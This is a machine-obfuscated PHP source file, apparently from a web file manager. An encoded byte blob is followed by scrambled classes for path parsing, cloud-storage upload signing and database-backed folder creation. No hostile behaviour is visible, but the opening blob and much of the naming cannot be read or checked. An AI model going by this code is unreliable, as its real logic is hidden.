\xf\xce\x7c\x32"._kodDe('LOQwHXZL4etmoLLM/fDh7J+Qp/E8tO2kvDjB2e5HrC9hxGqlNU9A8aDX7V863w==').base64_decode('Cw8uLjkV0MWhtRs3RV+4tfXW6e9O+OQBZdv0utWDx+xorPm29cjF9dmaTx4s')."\273\264\46\123\163\375\11\215\322\242\313\346\215\77\356\255\25\323\237\373\344\353\237\56\335\360\342\111\57\56\321\245\347\26\134\134\173\202\273\276\367\42\355\250\325"."\27\155\77\314\35\174\360\304\3\116\74\254\355\234\263\176\273\276\144\205\173\353\267\43\336\34\71\76\322\377\257\155\257\217\155\357\274\177\343\73\37\317\330\345\315"."\156\335\161\337\53\235\227\156\364\357\61\372\253\62\333\256\265\77\360\347\37\336\272\166\306\310\266\31\343\167\334\121\62\366\264\23\177\74\276\164\324\353\7\173\132"."\xcf\xd9\xf2\xf6\x1\xc9\x25\x1d\x7\x5c\x19\xbc\x6b\xf2\xe3\x9b\x3d\xfe\x8f\x5c\xaf\x36\x9e\xf2\xc1\xf7\x53\xdb\x95\x6f\xea\x6e\x59\xe7\xf9\x4a\x1b\xf1\xe0\x8b\x99\xd9\xe3\xdb\x3e"."\177\166\322\270\265\117\35\275\320\114\335\326\332\170\340\37\276\215\134\130\366\303\354\125\216\375\107\276\362\315\143\377\170\372\211\212\321\347\234\264\365\306\201\353\356".base64_decode('+s3mBScevrls07iaux0TLl3eHOoPzb31rXVtz3/x0c7k0i2V94XuC751xz8+')."\34\352\177\163\336\366\327\374\277\77\276\306\174\260\345\214\336\165\157\4\366\376\373\374\305\167\365\150\53\156\170\263\357\320\347\316\364\145\154\157\76\364\300\206\216".base64_decode('Pzwz95O1idHHPz0krVyy4uSTfjrCvn7Gca8dtuaxk26unOG5anvTeVPLtwwu').base64_decode('WXh092nXj9nhv3j3/TNfee6oN9bv3frKe4fvXXjysm/+9eUXzpW/eu/Q/+wb')."\xfa\xfe\xa3\xaf\x3e\xda\xfa\xee\x13\xdf\xfd\xee\xe1\xa5\x7b\x13\x1b\xbf\xfb\xeb\xf6\x67\xf\xff\xa2\x6e\xec\xbe\x1f\x5e\xdf\xf7\xbb\x1f\x3f\xf8\x68\xe7\x37\x5b\x2f\x3b\xf8\xa9\xf5"."\x8f\x8e\x9d\x7d\xc6\x29\x43\xdf\x7c\xf2\x4f\xd9\xf9\xf3\x8f\xbb\x8f\xd5\x93\x37\xff\x71\xdc\x19\xdf\x3f\x26\xcf\x3f\xb3\xfc\xd2\xf\x92\x47\x5f\x92\xdb\x51\x66\xb\x5c\x70\xc2\x73"."\211\303\216\337\262\341\260\43\237\333\364\315\127\127\236\267\371\260\276\73\107\237\65\345\274\157\46\336\361\364\342\336\330\222\35\263\256\372\303\143\343\202\235\177\337".strrev('+Ö}İ>j«+3mMçrşsÏò¹œ_¯æ½±×]öîó½àô5¿/3×}mõõ').base64_decode('n3178EP3te8+6vkfeu9ckU1+dcC6hjmTLzn28S0bzj925vR7Ln3wtpqtp346')."\xe3\x86\xd3\x12\x75\x47\x3f\xb6\xee\x37\xd1\xc7\x3f\x5d\xf7\xc7\xfe\xb3\x4f\xfa\xec\xb0\x79\xcd\xf\x7\x47\x3f\xb1\xf6\x9d\x91\x9b\xa6\xee\x1d\x33\x79\xcb\x5\x77\x6c\xf8\xd7\x21"."\17\134\166\302\145\341\103\313\316\376\317\301\3\207\336\370\352\137\16\247\327\315\360\71\56\345\334\205\47\355\275\72\322\260\70\104\335\14\311\40\315\222\50\257\145"."\x66\x45\xae\x2\x49\xd0\x40\x7e\xb6\xa1\x0\x62\x55\x44\xb1\xbe\x38\xd4\xc2\xaa\xa0\x2c\xdc\xed\x3e\x71\x21\x5f\xd4\x51\x3e\x14\x90\xc8\x8f\x47\xed\x62\x9a\xe\x18\x17\xec\xc3\x4d"."\xee\x70\x47\x74\x3d\x46\x47\x87\xd9\x1\x6b\xf3\xf0\x9c\xa7\xdd\xb0\xe1\xe1\xdb\x18\x57\x80\x2b\xb4\x31\xaf\xf7\x36\xee\xfa\xc7\xc6\xa5\x2\x5b\xfe\x17\x44\xf9\xf7\x54\xac\x1f\x61"."\201\275\215\210\215\133\324\22\371\32\11\206\300\274\2\241\174\44\107\164\13\50\317\73\121\72\227\342\17\46\101\304\252\215\301\32\51\123\304\137\361\341\242\347\216"."\66\352\230\327\206\135\260\333\54\305\177\341\23\0\170\372\170\130\234\303\202\126\377\213\246\210\223\4\244\246\1\2\257\313\14\251\374\322\164\101\52\61\145\352\364"."\123\105\35\45\237\3\256\360\302\75\64\204\202\344\36\233\330\265\322\253\33\66\317\222\165\331\110\324\117\267\350\250\4\45\132\75\66\20\147\353\2\217\313\326\327".base64_decode('/2Glu4qpQnAh4dKF1Sx+MqJIK///fijWp44oF0Ou9akuUVV6mHJE0GiIuhc+')."\64\354\246\372\277\357\34\125\53\10\142\306\57\366\17\315\216\240\56\127\263\1\370\162\227\314\235\240\261\342\171\270\343\312\156\153\43\56\121\41\123\250\120\242\133".base64_decode('x+DaDLSQLIuKKREMi2cfVDSCxjpcZUiHSYKGnuJyeFbnYUgUAvTyRkkkLBoJ')."\20\367\60\71\132\130\344\211\74\40\107\205\70\0\362\155\22\206\331\157\357\272\33\7\136\175\376\202\65\357\174\376\345\225\104\70\72\160\331\376\205\302\121\347\274".base64_decode('zw4/u/JQ/6sHf7Xf3qMmnTbhqw9+//2IMcck9z9pweojn3pqTN+Gj9e/887r').base64_decode('nw9N3P7gb17et+GEtqeuPWN+4/tdb7+x/ws/z6540jz42nFfHvXJrY5nz9W/').base64_decode('bxy54dnqn7/68sCnSt4eivWss/9p+s2zntjadO+j335boz9x7VGT3zvo6q2R').strrev('š:÷„Âu½/Oeô¾Ìö/ëéøìtƒ©î£¼˜¦åfùgüı67šÍıc')."\335\25\327\4\126\70\157\131\373\333\261\243\26\347\106\336\131\236\132\264\137\347\246\111\227\154\276\167\257\353\253\3\257\172\141\140\272\62\352\127\327\54\370\333\307".base64_decode('lyRmv7x+28DFl935q1Ff3/b1v/ejZ2yepPt/+goM/44N/yDM6FGjfvmbMMh/')."\xc5\x2f\x9c\x47\xe2\xf3\x7f\x58\x35\x73\x3b\x92\x55\xba\xd9\xeb\x79\xc\x17\x5d\x21\x9\xc7\xa0\xf8\xc9\x9f\x51\x62\x2a\x59\x83\x36\x4b\x8c\x44\xb8\xd4\xd\x49\x9f\x43\xb0\x68\x40"."\161\346\367\211\72\333\244\76\70\25\366\310\12\276\11\143\352\72\174\217\101\127\266\365\163\77\112\62\311\237\332\211\336\343\222\61\305\160\200\45\335\233\325\351\107".strrev('möG	ŒƒËO¡ŞE½âÖ˜;ËŞ+âäİ'."\0".'²bğƒ1eÀ‚_y¹ÍG'."\n".'DŠK')."\303\144\343\365\125\317\212\61\123\163\32\342\355\162\32\1\371\7\177\376\367\13\170\106\213\233\237\74\347\45\30\51\241\102\312\4\126\204\370\155\210\341\77\72\305"."\x9\x3b\x8e\xcb\x60\xb9\x5b\x55\x94\x48\x85\x9\xa9\x88\x5d\xcc\x87\x35\x72\xd8\x6a\x9\xaa\xd2\x42\x50\xeb\xe5\xc8\xeb\x2\xdb\x1e\x45\xb7\x4\xfd\x6\x92\xa0\xc4\x81\x21\xf1\xeb"."\126\105\306\107\267\131\320\320\321\221\155\205\62\165\235\340\372\101\260\167\55\370\320\126\126\267\124\16\170\151\341\216\27\373\240\306\37\367\200\16\164\265\204\115\12"."\267\66\227\41\317\53\20\200\236\252\41\77\246\213\10\7\261\110\32\55\11\377\141\157\266\145\60\31\126\262\110\362\265\360\157\13\224\113\334\13\253\370\311\22\170"."\41\322\240\263\305\156\165\66\145\52\175\252\133\67\314\210\226\61\207\113\27\126\252\340\255\162\36\164\164\103\207\11\217\35\126\206\340\136\374\112\217\265\122\60\325"."\x61\x8e\x17\xeb\xb7\x4f\xf2\xbf\x79\x82\xee\x18\xc\x74\x87\x4e\x7e\xe8\x2c\x20\xe3\x52\x11\x24\x5c\x47\xc0\xc7\x51\x56\xc5\x34\x4a\x44\x60\xea\x89\x9a\xd4\x20\x5c\xa8\x5a\xaf\xb6"."\331\336\51\40\56\71\315\57\44\243\122\140\265\146\265\164\67\374\205\276\245\220\307\40\41\31\137\14\271\372\24\146\157\231\137\252\325\302\262\12\27\341\161\264\336"."\270\120\200\12\302\317\307\242\77\256\214\226\137\42\333\243\31\211\172\366\175\131\236\77\227\346\137\235\345\331\341\227\60\213\201\1\153\124\204\276\166\51\175\374\222".base64_decode('lPN+iUSD0lckK/sOLoMCCMuKOBrB0x33C6P2i8cPyddV2B2YsRDKPeHljwrt')."\x5\x4d\xdc\xfb\xe\xd1\x85\x1e\x5b\x54\xd6\x6f\xdc\x39\xb8\x63\x5d\x5c\x95\xa1\xa3\x82\x4a\xc2\xcd\x12\x70\x1f\x99\x48\xc6\x9b\xb4\x3a\xec\x63\xd9\x2\xfc\xcb\x32\xdd\xe8\xd1\x94"."\335\2\315\163\146\3\57\75\42\371\34\67\116\62\305\257\263\131\257\277\105\31\321\62\341\176\241\72\361\152\174\330\2\341\342\215\360\125\151\105\261\340\354\260\13"."\177\302\311\102\26\171\146\302\4\133\152\266\20\115\66\130\222\63\44\46\132\272\230\77\335\210\167\347\153\25\3\123\350\246\0\247\271\254\111\70\277\232\67\42\261"."\x40\xfe\x68\x71\x9\xa3\x0\x67\xa4\x4c\xf1\xa6\xf3\x1b\xa0\x28\xcb\x37\x41\xe1\x95\x88\x92\x4e\xbe\x7d\x4c\x44\x2f\x52\x6\xf7\xa8\x68\x31\x9c\x4\x4b\x72\x26\xcb\x52\x56\x14\x6c"."\171\61\370\111\47\163\230\36\26\216\37\355\216\274\321\223\76\163\267\120\102\326\341\120\122\64\163\141\163\144\376\363\163\43\171\264\170\57\212\12\326\303\365\242\150"."\346\141\173\141\371\260\242\150\343\122\214\314\321\224\42\204\215\233\244\24\222\120\236\126\304\100\206\270\10\3\247\150\310\142\220\136\220\54\132\333\24\267\307\11\25"."\335\210\246\325\120\46\17\56\42\206\332\375\355\134\271\142\367\43\153\174\101\211\6\104\260\205\360\346\322\275\151\372\241\147\320\2\367\317\300\132\241\334\130\236\203".strrev(' %pwIY˜±<³¶ü-f-Ó‚åôP êìU¿HC„ª|Á9Ó"º').strrev('2Í½oĞg¢-0mdn°äá|6Ê~¤	l‹Ó|RÚ$ÜøÎáfıâÇrè')."\247\351\134\266\3\274\45\52\204\330\51\170\274\330\4\163\33\20\342\37\221\203\253\11\351\154\321\262\102\333\37\5\311\365\63\144\360\303\52\116\105\44\305\22\201"."\272\140\26\21\117\217\136\75\21\323\7\310\354\40\307\166\274\65\56\150\51\371\14\21\367\21\107\126\204\150\32\204\354\162\115\47\116\161\222\327\102\166\124\207\235"._kodDe('KTuti9utr/MtET3WaEDmBSoKyvekUnSu93iNWhTD5nrs1hiZdyCVYxF5BO0xVg==')."\101\101\62\52\45\330\141\25\44\5\233\2\55\303\245\171\233\135\76\177\101\32\264\313\202\317\35\250\177\156\234\344\13\242\136\272\374\176\152\2\134\330\13\237\173"."\56\357\11\272\341\347\342\133\246\107\117\13\13\126\60\105\244\132\331\260\102\337\146\101\102\314\76\23\50\204\325\224\242\45\13\252\263\312\301\342\224\233\324\31\74".base64_decode('C1i/AiceRnSZklqgTVULqTiUoQsbs9PYxskjviaDn/Ngm57xnwgFooEm/pqR').base64_decode('kIiPeIulhABHGwkqz2zCEs7vtIM8O8i7iSj8OrslwkOCRWvelA2rXbYYMgh8')."\300\60\266\21\174\162\40\166\116\323\211\255\341\142\75\46\250\121\61\152\55\110\25\255\362\160\330\222\214\274\276\61\72\27\321\43\112\67\241\153\220\367\340\261\372"."\101\61\54\352\145\146\63\132\206\50\33\46\146\371\246\131\202\365\17\327\143\366\151\31\56\0\103\264\265\151\2\356\71\345\227\111\106\231\25\253\142\241\51\54\204"."\x3\xe8\x2b\x28\xff\x3\x24\x3d\x13\xaf\x7c\x95\x0\x0".base64_decode('')."".""."", 10, -8))); goto A¯òô³Ç¿ø; f¬È¸½“Æ•: class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\163\x65\x72\x52\x65\143\171\x63\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\x46\x69\154\145\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\106\x69\x6c\x65\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\160\122\157\x6f\164\123\145\154\146\175"; const KOD_USER_SHARE = "\173\x75\x73\145\x72\123\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\x53\x68\141\x72\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\145\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\x72\145\x49\x74\x65\155\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\x63\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\122\x65\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\165\x73\x65\x72\x44\x72\x69\x76\145\162\175"; public static function typeList() { $eÃŒ©²« =& $_SERVER[°Óó£ÌİóèÅ]; return array($eÃŒ©²«[795] => self::KOD_SOURCE, $eÃŒ©²«[796] => self::KOD_USER_RECYCLE, $eÃŒ©²«[797] => self::KOD_USER_FAV, $eÃŒ©²«[798] => self::KOD_USER_FILE_TAG, $eÃŒ©²«[799] => self::KOD_USER_FILE_TYPE, $eÃŒ©²«[800] => self::KOD_GROUP_ROOT_SELF, $eÃŒ©²«[801] => self::KOD_USER_SHARE, $eÃŒ©²«[802] => self::KOD_USER_SHARE_LINK, $eÃŒ©²«[803] => self::KOD_USER_SHARE_TO_ME, $eÃŒ©²«[804] => self::KOD_SHARE_ITEM, $eÃŒ©²«[805] => self::KOD_SHARE_LINK, $eÃŒ©²«[806] => self::KOD_SEARCH, $eÃŒ©²«[807] => self::KOD_BLOCK, $eÃŒ©²«[808] => self::KOD_IO, $eÃŒ©²«[809] => self::KOD_USER_RECENT, $eÃŒ©²«[810] => self::KOD_USER_DRIVER); } public static function parse($AÕ›ï„‰÷©) { goto EÛ¡ŸŞº¨; EÛ¡ŸŞº¨: $cñùõÏ– õ =& $_SERVER[°Óó£ÌİóèÅ]; $AÕ›ï„‰÷© = self::clear($AÕ›ï„‰÷©); $a¬‹–èìĞ = array_values(self::typeList()); goto D§åÊ²°ë; bØñ§˜çô„: return $FĞ¸Ù‹‰È; goto C‡˜ÚÒÖôÖ; D§åÊ²°ë: preg_match($cñùõÏ– õ[811], $AÕ›ï„‰÷©, $bŞƒÅÄ†¿©); $FĞ¸Ù‹‰È = array($cñùõÏ– õ[812] => !1, $cñùõÏ– õ[813] => !1, $cñùõÏ– õ[814] => !1, $cñùõÏ– õ[84] => $AÕ›ï„‰÷©, $cñùõÏ– õ[758] => !1, $cñùõÏ– õ[757] => $cñùõÏ– õ[33]); if (is_array($bŞƒÅÄ†¿©) && count($bŞƒÅÄ†¿©) == 5) { $E»‰±Ş‰À’ = $cñùõÏ– õ[815] . $bŞƒÅÄ†¿©[2] . $cñùõÏ– õ[326]; if (in_array($E»‰±Ş‰À’, $a¬‹–èìĞ)) { $FĞ¸Ù‹‰È[$cñùõÏ– õ[758]] = $bŞƒÅÄ†¿©[1]; $FĞ¸Ù‹‰È[$cñùõÏ– õ[29]] = $E»‰±Ş‰À’; $FĞ¸Ù‹‰È[$cñùõÏ– õ[816]] = substr($E»‰±Ş‰À’, 1, -1); $FĞ¸Ù‹‰È[$cñùõÏ– õ[376]] = $bŞƒÅÄ†¿©[3]; } $FĞ¸Ù‹‰È[$cñùõÏ– õ[757]] = $bŞƒÅÄ†¿©[4]; } goto bØñ§˜çô„; C‡˜ÚÒÖôÖ: } public static function clear($aÉ†®é±á) { goto BŠ³Ÿæ¹¶­; c·ÇØ¾±¯ã: if ($aÉ†®é±á == $dÀÃ®Í÷¬[8]) { return $dÀÃ®Í÷¬[8]; } $aÉ†®é±á = rtrim($aÉ†®é±á, $dÀÃ®Í÷¬[8]); return $aÉ†®é±á; goto AÛè „©; BŠ³Ÿæ¹¶­: $dÀÃ®Í÷¬ =& $_SERVER[°Óó£ÌİóèÅ]; $aÉ†®é±á = str_replace($dÀÃ®Í÷¬[102], $dÀÃ®Í÷¬[8], $aÉ†®é±á); $e¾ğ˜Û†Ãè = $dÀÃ®Í÷¬[817]; goto a„ƒÜÑ„; a„ƒÜÑ„: if (substr($aÉ†®é±á, 0, 3) == $dÀÃ®Í÷¬[818]) { $aÉ†®é±á = substr($aÉ†®é±á, 3); } while (strstr($aÉ†®é±á, $e¾ğ˜Û†Ãè)) { $aÉ†®é±á = str_replace($e¾ğ˜Û†Ãè, $dÀÃ®Í÷¬[8], $aÉ†®é±á); } $aÉ†®é±á = preg_replace($dÀÃ®Í÷¬[819], $dÀÃ®Í÷¬[8], $aÉ†®é±á); goto c·ÇØ¾±¯ã; AÛè „©: } public static function sourceID($dä±ªêÎ˜™) { $e„÷ÏëŒˆê =& $_SERVER[°Óó£ÌİóèÅ]; $Cé–Ò…Ÿ¢† = self::parse($dä±ªêÎ˜™); if ($Cé–Ò…Ÿ¢†[$e„÷ÏëŒˆê[29]] !== self::KOD_SOURCE) { show_json(LNG($e„÷ÏëŒˆê[820]), !1); } return $Cé–Ò…Ÿ¢†[$e„÷ÏëŒˆê[376]]; } public static function make($Bì¯îªÃ•) { if (!$Bì¯îªÃ•) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Bì¯îªÃ•)); } public static function makeShare($fæœ‰¿êÄ÷, $DİÎáÎ­°Š) { return self::makePath(self::KOD_SHARE_ITEM, $fæœ‰¿êÄ÷, $DİÎáÎ­°Š); } public static function makeFileTypePath($A‘•ŒØÚÏ©) { return self::makePath(self::KOD_USER_FILE_TYPE, $A‘•ŒØÚÏ©); } public static function makeFileTagPath($Dìçó›Ôšê) { return self::makePath(self::KOD_USER_FILE_TAG, $Dìçó›Ôšê); } public static function makePath($dÖÃä„»ô, $C®ÁÆ‡Ì‰É = '', $FÂ¯æœÓÒ = '') { $EÂÇãæ”†Ğ =& $_SERVER[°Óó£ÌİóèÅ]; $bïÙç®ïñœ = substr($dÖÃä„»ô, 1, -1); $D±ñÔ°ë•ä = $EÂÇãæ”†Ğ[821] . $bïÙç®ïñœ . $EÂÇãæ”†Ğ[500] . $C®ÁÆ‡Ì‰É . $EÂÇãæ”†Ğ[822]; $D±ñÔ°ë•ä = $FÂ¯æœÓÒ ? $D±ñÔ°ë•ä . $FÂ¯æœÓÒ . $EÂÇãæ”†Ğ[8] : $D±ñÔ°ë•ä; return $D±ñÔ°ë•ä; } public static function initSystemPath() { $BŠàÛ¬ô–Ú =& $_SERVER[°Óó£ÌİóèÅ]; $D…‡‰íˆ¡ = array($BŠàÛ¬ô–Ú[823] => $BŠàÛ¬ô–Ú[824], $BŠàÛ¬ô–Ú[825] => $BŠàÛ¬ô–Ú[826], $BŠàÛ¬ô–Ú[827] => $BŠàÛ¬ô–Ú[828], $BŠàÛ¬ô–Ú[829] => $BŠàÛ¬ô–Ú[830]); foreach ($D…‡‰íˆ¡ as $F¡ø¹ÎÓÛé => $FÑéÏ¼¸¤) { if (!defined($F¡ø¹ÎÓÛé)) { define($F¡ø¹ÎÓÛé, self::systemPath($FÑéÏ¼¸¤)); } } } private static function systemPath($dÁŠ¯…¥»è) { goto C¿É×°ÅŞÇ; AºÇöŞ˜ºã: return $BŠ‡…Âá‡™; goto E§¢Óš§ºò; C¿É×°ÅŞÇ: $Fá×­‘…Ş‰ =& $_SERVER[°Óó£ÌİóèÅ]; $c¢Ÿã ÔºÂ = $Fá×­‘…Ş‰[831] . ucfirst($dÁŠ¯…¥»è); $BŠ‡…Âá‡™ = Model($Fá×­‘…Ş‰[832])->get($c¢Ÿã ÔºÂ); goto E¾ØÜ˜ÉÙ; E¾ØÜ˜ÉÙ: if ($BŠ‡…Âá‡™) { return $BŠ‡…Âá‡™; } if ($dÁŠ¯…¥»è == $Fá×­‘…Ş‰[824]) { $BŠ‡…Âá‡™ = self::make(Model($Fá×­‘…Ş‰[529])->systemRootPathAdd($Fá×­‘…Ş‰[833])); } else { $BŠ‡…Âá‡™ = self::systemPath($Fá×­‘…Ş‰[824]); $bÈÖ®ß¹¬ = self::sourceID($BŠ‡…Âá‡™); $BŠ‡…Âá‡™ = self::make(Model($Fá×­‘…Ş‰[529])->mkdir($bÈÖ®ß¹¬, $dÁŠ¯…¥»è)); } Model($Fá×­‘…Ş‰[832])->set($c¢Ÿã ÔºÂ, $BŠ‡…Âá‡™); goto AºÇöŞ˜ºã; E§¢Óš§ºò: } public static function systemFolder($B²¶Ãªã´†) { $E£çÑªÆ¥½ = IO_PATH_SYSTEM_SOURCE . $B²¶Ãªã´†; $EŠ…÷‡Î•© = Cache::get($E£çÑªÆ¥½); if (!$EŠ…÷‡Î•©) { $Dîõå°Èæµ = IO::infoFull($E£çÑªÆ¥½); if (!$Dîõå°Èæµ) { $EŠ…÷‡Î•© = IO::mkdir($E£çÑªÆ¥½, REPEAT_SKIP); } else { $EŠ…÷‡Î•© = $Dîõå°Èæµ[$_SERVER[°Óó£ÌİóèÅ][84]]; } Cache::set($E£çÑªÆ¥½, $EŠ…÷‡Î•©, 3600 * 10); } return $EŠ…÷‡Î•©; } public static function defaultDriver() { return Model($_SERVER[°Óó£ÌİóèÅ][469])->defaultDriver(); } public static function defaultIO() { $CïÙ¾ëâ˜ =& $_SERVER[°Óó£ÌİóèÅ]; $d³÷Œóš‰ˆ = self::defaultDriver(); return $CïÙ¾ëâ˜[834] . $d³÷Œóš‰ˆ[$CïÙ¾ëâ˜[376]] . $CïÙ¾ëâ˜[822]; } public static function fileTypeList() { $BÒ…Ë•ëæ =& $_SERVER[°Óó£ÌİóèÅ]; $C÷‡ÇéŠÄó = $GLOBALS[$BÒ…Ë•ëæ[6]][$BÒ…Ë•ëæ[835]]; foreach ($C÷‡ÇéŠÄó as $A¸–¨ˆõ×È => $CøÆåÖÖ‚Ô) { $dºœ¹ø‚“Œ = $BÒ…Ë•ëæ[836] . $A¸–¨ˆõ×È; $bºËã¼ù§¥ = LNG($dºœ¹ø‚“Œ); if ($dºœ¹ø‚“Œ != $bºËã¼ù§¥) { $C÷‡ÇéŠÄó[$A¸–¨ˆõ×È][$BÒ…Ë•ëæ[28]] = $bºËã¼ù§¥; } } return $C÷‡ÇéŠÄó; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($eôí•˜¥ß) { parent::__construct($eôí•˜¥ß); $this->signatureVersion($_SERVER[°Óó£ÌİóèÅ][208]); } public function uploadFormData($Fšéš£ˆÚï, $d‚ïİñ’» = 3600) { goto BäÑùÂ˜«; f¯Ã¹Öˆ: $cˆ£öŒÍÊÚ = sha1($CºáÎÏÖ¤); $B¡ ÈÙË†á = hash_hmac($dÛÈƒ¤–¯[232], $cˆ£öŒÍÊÚ, $F¿İ–‚¼Õˆ); $BÍˆÙ¾®‰ = array($dÛÈƒ¤–¯[841] => $bÓ‚ÖëÛÀ, $dÛÈƒ¤–¯[845] => $aÊ…¾”¦, $dÛÈƒ¤–¯[849] => base64_encode($CºáÎÏÖ¤), $dÛÈƒ¤–¯[846] => $Bö„ê©Æ÷, $dÛÈƒ¤–¯[847] => $this->accessKey, $dÛÈƒ¤–¯[850] => $fŠÕêˆ‹¨å, $dÛÈƒ¤–¯[851] => $B¡ ÈÙË†á, $dÛÈƒ¤–¯[174] => $this->getHost()); goto fÑÚÑ©µ­Ë; BäÑùÂ˜«: $dÛÈƒ¤–¯ =& $_SERVER[°Óó£ÌİóèÅ]; $bÓ‚ÖëÛÀ = $dÛÈƒ¤–¯[190]; $Bö„ê©Æ÷ = $dÛÈƒ¤–¯[232]; goto E‚Œ„”˜á‹; E‚Œ„”˜á‹: $aÊ…¾”¦ = $dÛÈƒ¤–¯[837]; $EÒãÛëàŒÃ = gmdate($dÛÈƒ¤–¯[838], time() + $d‚ïİñ’»); $fŠÕêˆ‹¨å = (string) time() . $dÛÈƒ¤–¯[76] . (string) (time() + $d‚ïİñ’»); goto aÇ«Ó¼­; fÑÚÑ©µ­Ë: return $BÍˆÙ¾®‰; goto FçÃ²ÓÕ®ë; aÇ«Ó¼­: $CºáÎÏÖ¤ = array($dÛÈƒ¤–¯[839] => $EÒãÛëàŒÃ, $dÛÈƒ¤–¯[840] => array(array($dÛÈƒ¤–¯[841] => $bÓ‚ÖëÛÀ), array($dÛÈƒ¤–¯[842] => $this->bucket), array($dÛÈƒ¤–¯[843], $dÛÈƒ¤–¯[844], $dÛÈƒ¤–¯[33]), array($dÛÈƒ¤–¯[845] => $aÊ…¾”¦), array($dÛÈƒ¤–¯[846] => $Bö„ê©Æ÷), array($dÛÈƒ¤–¯[847] => $this->accessKey), array($dÛÈƒ¤–¯[848] => $fŠÕêˆ‹¨å))); $CºáÎÏÖ¤ = json_encode($CºáÎÏÖ¤); $F¿İ–‚¼Õˆ = hash_hmac($dÛÈƒ¤–¯[232], $fŠÕêˆ‹¨å, $this->secret); goto f¯Ã¹Öˆ; FçÃ²ÓÕ®ë: } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($A…Ğ×§Ûòá) { $this->pathParse = $A…Ğ×§Ûòá; $this->model = Model($_SERVER[°Óó£ÌİóèÅ][852]); } public function getPath($B¾İ§¢Ö„‘) { return trim($B¾İ§¢Ö„‘, $_SERVER[°Óó£ÌİóèÅ][8]); } public function pathFather($EÖÆ ×¥„¹) { $Cëš‰£©Ñ = $this->parse($EÖÆ ×¥„¹); $Cëš‰£©Ñ = $this->infoSimple($EÖÆ ×¥„¹); return $Cëš‰£©Ñ ? $Cëš‰£©Ñ[$_SERVER[°Óó£ÌİóèÅ][392]] : !1; } public function getPathName($F™òÅœ®¤¦) { $BÜ¤ó·’ò‡ = $this->infoSimple($F™òÅœ®¤¦); return $BÜ¤ó·’ò‡ ? $BÜ¤ó·’ò‡[$_SERVER[°Óó£ÌİóèÅ][28]] : !1; } public function getPathOuter($bÛÚëÍóÉ) { if (!$bÛÚëÍóÉ) { return $bÛÚëÍóÉ; } $BØ¶çƒ¸¥ = $this->parse($bÛÚëÍóÉ); return KodIO::make($BØ¶çƒ¸¥[$_SERVER[°Óó£ÌİóèÅ][376]]); } public function copyFolderFromIO($D±•ÆØŠˆ, $c‹œ¤†ÌÃ™, $Cç¡¦»ó˜, $eÔ˜ôÌ¦ó, $BÅ½ñšÅ‹’) { $e¥åØ‹öé = $this->model->copyFolderFromIO($D±•ÆØŠˆ, $c‹œ¤†ÌÃ™, $Cç¡¦»ó˜, $eÔ˜ôÌ¦ó, $BÅ½ñšÅ‹’); return KodIO::make($e¥åØ‹öé); } public function isParentOf($cø–ê‘ìîÃ, $FÜ›‰šÍƒ) { return $this->model->isParentOf($cø–ê‘ìîÃ, $FÜ›‰šÍƒ); } public function mkfile($C‹åƒ¢˜Ïö, $FÓ‘ßí÷ ¨ = '', $cã¾¬Òê = REPEAT_RENAME) { $F¦µªîº¶– =& $_SERVER[°Óó£ÌİóèÅ]; $eÑ×”¹ÕÕÍ = $this->parse($C‹åƒ¢˜Ïö); $C‹åƒ¢˜Ïö = $eÑ×”¹ÕÕÍ[$F¦µªîº¶–[376]]; for ($b‘†á³’ˆ = 0; $b‘†á³’ˆ < count($eÑ×”¹ÕÕÍ[$F¦µªîº¶–[853]]); $b‘†á³’ˆ++) { $BŸ¼ÑÂ›†ƒ = $eÑ×”¹ÕÕÍ[$F¦µªîº¶–[853]][$b‘†á³’ˆ]; $f«İÛ¢‘š = "\120\x61\x74\150\104\162\151\x76\x65\162\x44\x42\x2e\x6d\x6b\x64\151\x72\x2e{$C‹åƒ¢˜Ïö}\56{$BŸ¼ÑÂ›†ƒ}"; CacheLock::lock($f«İÛ¢‘š); if ($b‘†á³’ˆ == count($eÑ×”¹ÕÕÍ[$F¦µªîº¶–[853]]) - 1) { $C‹åƒ¢˜Ïö = $this->model->mkfile($C‹åƒ¢˜Ïö, $BŸ¼ÑÂ›†ƒ, $FÓ‘ßí÷ ¨, $cã¾¬Òê); CacheLock::unlock($f«İÛ¢‘š); break; } $C‹åƒ¢˜Ïö = $this->model->mkdir($C‹åƒ¢˜Ïö, $BŸ¼ÑÂ›†ƒ, REPEAT_SKIP); CacheLock::unlock($f«İÛ¢‘š); } return $this->getPathOuter($C‹åƒ¢˜Ïö); } public function mkdir($Bˆ•ˆù¸µ, $a–ÊÆ›‡˜° = REPEAT_SKIP) { $b™ôÃëÃ·» =& $_SERVER[°Óó£ÌİóèÅ]; $fˆ¼—Öª”Á = $this->parse($Bˆ•ˆù¸µ); $Bˆ•ˆù¸µ = $fˆ¼—Öª”Á[$b™ôÃëÃ·»[376]]; for ($D…¥ï¨ÈÖ = 0; $D…¥ï¨ÈÖ < count($fˆ¼—Öª”Á[$b™ôÃëÃ·»[853]]); $D…¥ï¨ÈÖ++) { $FŞ©ƒ½Ÿø§ = $fˆ¼—Öª”Á[$b™ôÃëÃ·»[853]][$D…¥ï¨ÈÖ]; $Fğ·ß ²Æ‘ = "\120\141\164\150\104\162\x69\x76\145\162\104\x42\56\x6d\x6b\x64\x69\x72\x2e{$Bˆ•ˆù¸µ}\56{$FŞ©ƒ½Ÿø§}"; 